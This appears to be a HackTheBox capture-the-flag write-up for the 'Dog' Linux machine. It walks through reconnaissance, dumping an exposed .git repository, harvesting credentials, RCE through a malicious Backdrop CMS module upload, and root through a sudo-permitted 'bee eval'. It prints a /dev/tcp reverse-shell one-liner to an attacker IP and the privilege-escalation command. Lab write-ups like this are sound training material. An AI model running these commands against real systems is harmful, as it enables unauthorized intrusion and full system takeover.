# Dog — HackTheBox Writeup

**Name:** Dog
**OS:** Linux
**Release Date:** 9 March, 2025
**Solved On:** 9 March, 2025
**Difficulty:** Easy
**Points:** 20
**Author:** FisMatHack

---

## 🛰️ Ping Test

```bash
n0tabdu11ah@MNM:~/CTF/HTB/Dog$ ping -c 4 10.10.11.58
PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data.
64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=309 ms
64 bytes from 10.10.11.58: icmp_seq=2 ttl=63 time=242 ms
64 bytes from 10.10.11.58: icmp_seq=3 ttl=63 time=240 ms
--- 10.10.11.58 ping statistics ---
4 packets transmitted, 3 received, 25% packet loss
rtt min/avg/max/mdev = 240/263/309/32 ms
```

---

## 🔍 Reconnaissance

```bash
sudo nmap -sV -sC 10.10.11.58
```

### **Nmap Results**

```
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http       Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1
```

The webserver runs **Backdrop CMS**, which hints at possible CMS-related vulnerabilities.

---

## 🌐 Web Application — Port 80

Visiting the website reveals a Backdrop CMS default-style homepage.

---

## 🧪 Directory Fuzzing

Fuzzing reveals an exposed **.git** directory.

---

## 📥 Git Dump

Using GitDumper:

```bash
./gitdumper.sh http://10.10.11.58/.git/ extracted_repo
```

The repository is successfully downloaded.

### Dump Contents

```bash
ls extracted_repo
core/ files/ index.php layouts/ LICENSE.txt README.md robots.txt settings.php sites/ themes/
```

---

## 🔑 Credential Harvesting

Searching inside the repository:

```bash
grep -R "@dog" -n .
```

Reveals:

* `root <dog@dog.htb>` in logs
* `"tiffany@dog.htb"` inside a config file

These credentials allow login into Backdrop CMS.

---

## 🐾 Initial Foothold — Backdrop CMS RCE

Backdrop CMS **1.27.1** is vulnerable to **Authenticated RCE** via malicious module upload.

Exploit tool:

```bash
python3 dog-rce.py http://10.10.11.58/
```

This generates `shell.zip`. Backdrop does not allow ZIP uploads, so convert it:

```bash
unzip shell.zip -d temp_dir
tar -czf shell.tar.gz -C temp_dir .
rm -rf temp_dir
```

Upload the module at:

```
http://10.10.11.58/?q=admin/modules/install
```

### Reverse Shell

Open listener:

```bash
nc -lvnp 4444
```

Access shell.php and execute:

```
sh -i >& /dev/tcp/10.10.16.117/4444 0>&1
```

We get **www-data** shell.

---

## 👤 User Flag

Password reuse allows switching to user **johncusack**:

```bash
ssh johncusack@10.10.11.58
```

Retrieve user flag:

```bash
cat ~/user.txt
```

---

## 🚀 Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

User `johncusack` can run:

```
/usr/local/bin/bee
```

### Root via Bee

Execute arbitrary system command:

```bash
sudo bee eval 'system("/bin/bash");'
```

We now have a **root shell**.

Retrieve root flag:

```bash
cat /root/root.txt
```

---

## 🧠 Key Takeaways

* Exposed `.git` directories often lead to full source & config leakage.
* Backdrop CMS 1.27.1 allows authenticated RCE via crafted module uploads.
* Password reuse enables privilege hopping.
* Sudo-wrapped eval functions = **instant root**.

---

## 📁 Directory Used

```
~/CTF/HTB/Dog/
```

---

## 🎯 Flags

* **User:** ✔️ `1a0d************************`
* **Root:** ✔️ `ac65************************`

---

**Completed on:** 9 March, 2025
🔥 *Another one in the bag — On to the next box!*
